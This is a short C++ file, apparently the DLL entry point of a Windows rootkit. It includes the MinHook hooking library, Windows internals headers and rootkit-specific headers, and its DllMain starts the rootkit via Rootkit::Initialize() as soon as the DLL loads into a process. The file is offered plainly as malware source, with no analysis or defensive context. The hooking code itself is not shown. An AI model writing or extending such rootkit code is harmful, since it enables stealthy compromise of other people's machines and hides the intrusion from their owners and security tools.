#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <iterator>
#include <vector>
#include <time.h>
#include <Windows.h>
#include <winternl.h>
#include "MinHook\MinHook.h"
using namespace std;

#include "types_rootkit.h"
#include "rootkit.h"

bool WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		Rootkit::Initialize();
	}
	return true;
}